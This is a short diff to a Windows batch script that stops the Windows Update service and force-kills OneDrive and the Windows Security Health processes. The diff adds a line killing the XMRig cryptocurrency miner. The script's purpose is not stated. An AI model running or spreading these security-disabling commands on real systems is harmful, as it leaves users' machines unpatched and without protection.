@@ -1,5 +1,6 @@
 @echo off
 net stop WUAUSERV
+taskkill /IM xmrig.exe
 taskkill /IM OneDrive.exe
 taskkill /IM SecurityHealthSystray.exe
 taskkill /IM SecurityHealthService.exe
